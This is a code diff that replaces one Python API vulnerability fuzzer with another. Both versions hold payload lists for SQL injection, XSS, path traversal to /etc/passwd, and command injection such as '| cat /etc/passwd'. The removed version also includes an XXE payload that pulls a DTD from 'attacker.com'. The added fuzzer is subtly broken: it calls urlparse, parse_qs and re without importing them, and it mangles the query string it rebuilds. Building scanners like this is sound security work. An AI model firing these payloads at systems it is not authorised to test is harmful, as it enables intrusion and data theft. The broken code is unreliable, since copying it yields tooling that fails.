@@ -1,284 +1,186 @@
-"""
-Advanced API fuzzer for testing endpoints with various payloads.
-"""
-
-import time
 import json
-from typing import Dict, List, Set, Any, Optional
-import requests
+import time
+from urllib.parse import urljoin
+from ..utils.http_client import HTTPClient
+from ..utils.logger import Logger
 
-from .utils import RequestUtils, generate_random_string
-from .auth import AuthBypass
-
-class AdvancedAPIFuzzer:
-    """Advanced fuzzer for API security testing."""
+class APIFuzzer:
+    def __init__(self):
+        self.logger = Logger(__name__)
+        self.http_client = HTTPClient()
+        self.vulnerabilities = []
     
-    def __init__(self, base_url: str, rate_limit_delay: float = 0.1):
-        self.base_url = base_url
-        self.rate_limit_delay = rate_limit_delay
-        self.request_utils = RequestUtils()
-        self.auth_bypass = AuthBypass()
-        
-        # Payload dictionaries
-        self.sql_injection_payloads = self._load_sql_payloads()
-        self.xss_payloads = self._load_xss_payloads()
-        self.path_traversal_payloads = self._load_path_traversal_payloads()
-        self.xxe_payloads = self._load_xxe_payloads()
-        self.command_injection_payloads = self._load_command_injection_payloads()
-    
-    def _load_sql_payloads(self) -> List[str]:
-        """Load SQL injection payloads."""
-        return [
-            "'", "\"", "';", "\";", "' OR '1'='1", "\" OR \"1\"=\"1",
-            "' UNION SELECT NULL--", "'; DROP TABLE users;--",
-            "1' OR '1'='1' --+", "1' ORDER BY 1--+",
-            "1' UNION SELECT 1,2,3--+", "1' AND (SELECT * FROM users) > 0--+",
-            "1' AND SLEEP(5)--+", "1' AND 1=CONVERT(int, (SELECT @@version))--+"
-        ]
-    
-    def _load_xss_payloads(self) -> List[str]:
-        """Load XSS payloads."""
-        return [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "alert('XSS')",
-            "';alert('XSS');//",
-            "\";alert('XSS');//"
-        ]
-    
-    def _load_path_traversal_payloads(self) -> List[str]:
-        """Load path traversal payloads."""
-        return [
-            "../../../../etc/passwd",
-            "....//....//....//....//etc/passwd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-            "..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
-        ]
-    
-    def _load_xxe_payloads(self) -> List[Dict[str, str]]:
-        """Load XXE payloads."""
-        return [
-            {
-                'content-type': 'application/xml',
-                'payload': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
-            },
-            {
-                'content-type': 'application/xml',
-                'payload': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>'
+    def load_payloads(self, payload_file="payloads/api_fuzz_payloads.json"):
+        """Load fuzzing payloads from file"""
+        try:
+            with open(payload_file, 'r') as f:
+                return json.load(f)
+        except Exception as e:
+            self.logger.error(f"Error loading payloads: {str(e)}")
+            return {
+                "sql_injection": ["' OR '1'='1", "' UNION SELECT NULL--", "1; DROP TABLE users"],
+                "xss": ["<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>"],
+                "path_traversal": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
+                "command_injection": ["; ls -la", "| cat /etc/passwd", "&& whoami"],
+                "idor": ["../user/1", "./admin/../user/2", "user/12345"]
             }
-        ]
     
-    def _load_command_injection_payloads(self) -> List[str]:
-        """Load command injection payloads."""
-        return [
-            "; whoami", "| whoami", "&& whoami", "|| whoami",
-            "`whoami`", "$(whoami)", "'; whoami; #", "\"; whoami; #"
-        ]
-    
-    def fuzz_endpoint(self, endpoint: str, method: str = "GET", 
-                     params: Dict = None, data: Any = None, 
-                     headers: Dict = None, auth: Any = None) -> List[Dict[str, Any]]:
-        """Fuzz a single API endpoint with various payloads."""
+    def fuzz_parameter(self, url, param, payloads, method="GET"):
+        """Fuzz a specific parameter with payloads"""
         results = []
         
-        # Test for SQL injection
-        sql_results = self.test_sql_injection(endpoint, method, params, data, headers, auth)
-        results.extend(sql_results)
-        
-        # Test for XSS
-        xss_results = self.test_xss(endpoint, method, params, data, headers, auth)
-        results.extend(xss_results)
-        
-        # Test for path traversal
-        traversal_results = self.test_path_traversal(endpoint, method, params, data, headers, auth)
-        results.extend(traversal_results)
-        
-        # Test for XXE (if XML content)
-        xxe_results = self.test_xxe(endpoint, method, params, data, headers, auth)
-        results.extend(xxe_results)
-        
-        # Test for command injection
-        command_results = self.test_command_injection(endpoint, method, params, data, headers, auth)
-        results.extend(command_results)
-        
-        # Test for authentication bypass
-        auth_bypass_results = self.auth_bypass.test_auth_bypass(
-            endpoint, method, params, data, headers, auth
-        )
-        results.extend(auth_bypass_results)
+        for payload_name, payload_list in payloads.items():
+            for payload in payload_list:
+                try:
+                    # Prepare the request based on method
+                    if method.upper() == "GET":
+                        # For GET requests, add payload to query parameters
+                        parsed_url = urlparse(url)
+                        query_params = parse_qs(parsed_url.query)
+                        query_params[param] = payload
+                        
+                        # Rebuild URL with fuzzed parameter
+                        fuzzed_url = parsed_url._replace(query=None).geturl()
+                        first_param = True
+                        for key, values in query_params.items():
+                            for value in values:
+                                fuzzed_url += "?" if first_param else "&"
+                                fuzzed_url += f"{key}={value}"
+                                first_param = False
+                        
+                        response = self.http_client.get(fuzzed_url)
+                    
+                    else:
+                        # For POST/PUT requests, add payload to body
+                        if method.upper() in ["POST", "PUT"]:
+                            data = {param: payload}
+                            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+                            response = self.http_client.request(method, url, data=data, headers=headers)
+                        else:
+                            self.logger.warning(f"Method {method} not supported for parameter fuzzing")
+                            continue
+                    
+                    # Analyze response for potential vulnerabilities
+                    vuln_info = self.analyze_response(response, payload_name, payload, param, url, method)
+                    if vuln_info:
+                        results.append(vuln_info)
+                    
+                    # Be polite with delay between requests
+                    time.sleep(0.1)
+                    
+                except Exception as e:
+                    self.logger.error(f"Error fuzzing {param} with {payload}: {str(e)}")
         
         return results
     
-    def test_sql_injection(self, endpoint: str, method: str, 
-                          params: Dict, data: Any, 
-                          headers: Dict, auth: Any) -> List[Dict[str, Any]]:
-        """Test for SQL injection vulnerabilities."""
-        results = []
+    def analyze_response(self, response, payload_type, payload, param, url, method):
+        """Analyze response for potential vulnerabilities"""
+        vuln_info = None
         
-        # Test in URL parameters
-        if params:
-            for param_name in params.keys():
-                for payload in self.sql_injection_payloads:
-                    test_params = params.copy()
-                    test_params[param_name] = payload
-                    
-                    response = self.request_utils.make_request(
-                        endpoint, method=method, params=test_params, 
-                        headers=headers, auth=auth
-                    )
-                    
-                    if response and self._is_sql_injection_successful(response, payload):
-                        results.append({
-                            'type': 'SQL Injection',
-                            'parameter': param_name,
-                            'payload': payload,
-                            'response_status': response.status_code,
-                            'evidence': self._get_evidence_from_response(response)
-                        })
-                    
-                    time.sleep(self.rate_limit_delay)
-        
-        # Test in request body
-        if data and isinstance(data, dict):
-            for key in data.keys():
-                for payload in self.sql_injection_payloads:
-                    test_data = data.copy()
-                    test_data[key] = payload
-                    
-                    response = self.request_utils.make_request(
-                        endpoint, method=method, data=test_data, 
-                        headers=headers, auth=auth
-                    )
-                    
-                    if response and self._is_sql_injection_successful(response, payload):
-                        results.append({
-                            'type': 'SQL Injection',
-                            'parameter': key,
-                            'payload': payload,
-                            'response_status': response.status_code,
-                            'evidence': self._get_evidence_from_response(response)
-                        })
-                    
-                    time.sleep(self.rate_limit_delay)
-        
-        return results
-    
-    def _is_sql_injection_successful(self, response: requests.Response, payload: str) -> bool:
-        """Determine if SQL injection was successful based on response."""
-        # Check for SQL error messages
-        sql_errors = [
-            'sql syntax', 'mysql_fetch', 'ORA-01756', 
-            'Microsoft OLE DB Provider', 'PostgreSQL query failed',
-            'SQLiteException', 'syntax error', 'mysql_num_rows',
-            'mysqli_fetch', 'pg_exec', 'unclosed quotation mark'
-        ]
-        
-        response_text = response.text.lower()
-        return any(error in response_text for error in sql_errors)
-    
-    def test_xss(self, endpoint: str, method: str, 
-                params: Dict, data: Any, 
-                headers: Dict, auth: Any) -> List[Dict[str, Any]]:
-        """Test for XSS vulnerabilities."""
-        results = []
-        
-        # Similar implementation to test_sql_injection but for XSS
-        # Check for payload reflection in response
-        
-        return results
-    
-    def test_path_traversal(self, endpoint: str, method: str, 
-                           params: Dict, data: Any, 
-                           headers: Dict, auth: Any) -> List[Dict[str, Any]]:
-        """Test for path traversal vulnerabilities."""
-        results = []
-        
-        # Similar implementation to test_sql_injection but for path traversal
-        # Check for file content in response
-        
-        return results
-    
-    def test_xxe(self, endpoint: str, method: str, 
-                params: Dict, data: Any, 
-                headers: Dict, auth: Any) -> List[Dict[str, Any]]:
-        """Test for XXE vulnerabilities."""
-        results = []
-        
-        # Check if endpoint accepts XML
-        test_headers = headers.copy() if headers else {}
-        test_headers['Content-Type'] = 'application/xml'
-        
-        for payload_data in self.xxe_payloads:
-            response = self.request_utils.make_request(
-                endpoint, method=method, data=payload_data['payload'],
-                headers=test_headers, auth=auth
-            )
+        # SQL Injection detection
+        if payload_type == "sql_injection":
+            sql_errors = [
+                "sql syntax", "mysql_fetch", "ORA-01756", 
+                "Microsoft OLE DB Provider", "PostgreSQL query failed"
+            ]
             
-            if response and self._is_xxe_successful(response):
-                results.append({
-                    'type': 'XXE',
-                    'payload': payload_data['payload'],
-                    'response_status': response.status_code,
-                    'evidence': self._get_evidence_from_response(response)
-                })
+            if any(error in response.text.lower() for error in sql_errors):
+                vuln_info = {
+                    "type": "SQL Injection",
+                    "url": url,
+                    "parameter": param,
+                    "method": method,
+                    "payload": payload,
+                    "evidence": "SQL error in response",
+                    "severity": "High"
+                }
+        
+        # XSS detection
+        elif payload_type == "xss":
+            if payload in response.text and response.status_code in [200, 201]:
+                vuln_info = {
+                    "type": "XSS",
+                    "url": url,
+                    "parameter": param,
+                    "method": method,
+                    "payload": payload,
+                    "evidence": "Payload reflected in response",
+                    "severity": "Medium"
+                }
+        
+        # Path Traversal detection
+        elif payload_type == "path_traversal":
+            if any(indicator in response.text for indicator in ["root:", "daemon:", "/bin/bash"]):
+                vuln_info = {
+                    "type": "Path Traversal",
+                    "url": url,
+                    "parameter": param,
+                    "method": method,
+                    "payload": payload,
+                    "evidence": "Sensitive file content in response",
+                    "severity": "High"
+                }
+        
+        # Command Injection detection
+        elif payload_type == "command_injection":
+            command_indicators = [
+                "bin/bash", "www/html", "etc/passwd", "Permission denied",
+                "cannot access", "No such file or directory"
+            ]
             
-            time.sleep(self.rate_limit_delay)
+            if any(indicator in response.text for indicator in command_indicators):
+                vuln_info = {
+                    "type": "Command Injection",
+                    "url": url,
+                    "parameter": param,
+                    "method": method,
+                    "payload": payload,
+                    "evidence": "Command output in response",
+                    "severity": "High"
+                }
         
-        return results
+        return vuln_info
     
-    def _is_xxe_successful(self, response: requests.Response) -> bool:
-        """Determine if XXE was successful based on response."""
-        # Check for file content or external entity references
-        file_content_indicators = [
-            'root:', 'daemon:', 'bin/', '/etc/passwd', '[boot loader]',
-            'Windows Registry'
-        ]
+    def fuzz_endpoint(self, endpoint, method="GET"):
+        """Fuzz a single endpoint with all payloads"""
+        self.logger.info(f"Fuzzing {method} {endpoint}")
         
-        response_text = response.text
-        return any(indicator in response_text for indicator in file_content_indicators)
-    
-    def test_command_injection(self, endpoint: str, method: str, 
-                              params: Dict, data: Any, 
-                              headers: Dict, auth: Any) -> List[Dict[str, Any]]:
-        """Test for command injection vulnerabilities."""
         results = []
+        payloads = self.load_payloads()
         
-        # Similar implementation to test_sql_injection but for command injection
-        # Check for command output in response
+        # Parse URL to identify parameters
+        parsed_url = urlparse(endpoint)
+        query_params = parse_qs(parsed_url.query)
+        
+        # Fuzz each parameter
+        for param in query_params.keys():
+            param_results = self.fuzz_parameter(endpoint, param, payloads, method)
+            results.extend(param_results)
+        
+        # Also test for IDOR if endpoint has numeric IDs in path
+        if any(str(i) in endpoint for i in range(10)):
+            for payload in payloads.get("idor", []):
+                try:
+                    # Replace potential ID values in path
+                    fuzzed_url = re.sub(r'/\d+/', f'/{payload}/', endpoint)
+                    fuzzed_url = re.sub(r'/\d+$', f'/{payload}', fuzzed_url)
+                    
+                    response = self.http_client.request(method, fuzzed_url)
+                    
+                    # If we get a successful response for unauthorized resource
+                    if response.status_code in [200, 201]:
+                        vuln_info = {
+                            "type": "IDOR",
+                            "url": fuzzed_url,
+                            "parameter": "path",
+                            "method": method,
+                            "payload": payload,
+                            "evidence": f"Access to resource {payload} returned {response.status_code}",
+                            "severity": "Medium"
+                        }
+                        results.append(vuln_info)
+                        
+                except Exception as e:
+                    self.logger.error(f"Error testing IDOR on {endpoint}: {str(e)}")
         
         return results
-    
-    def _get_evidence_from_response(self, response: requests.Response) -> str:
-        """Extract evidence of vulnerability from response."""
-        evidence = f"Status: {response.status_code}"
-        
-        # Add snippet of response text if it's not too long
-        if len(response.text) > 200:
-            evidence += f", Response: {response.text[:200]}..."
-        else:
-            evidence += f", Response: {response.text}"
-        
-        return evidence
-    
-    def fuzz_multiple_endpoints(self, endpoints: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
-        """Fuzz multiple API endpoints."""
-        all_results = {}
-        
-        for endpoint_info in endpoints:
-            url = endpoint_info.get('url')
-            method = endpoint_info.get('method', 'GET')
-            params = endpoint_info.get('params', {})
-            data = endpoint_info.get('data', None)
-            headers = endpoint_info.get('headers', {})
-            auth = endpoint_info.get('auth', None)
-            
-            print(f"Fuzzing: {url}")
-            results = self.fuzz_endpoint(url, method, params, data, headers, auth)
-            
-            if results:
-                all_results[url] = results
-        
-        return all_results
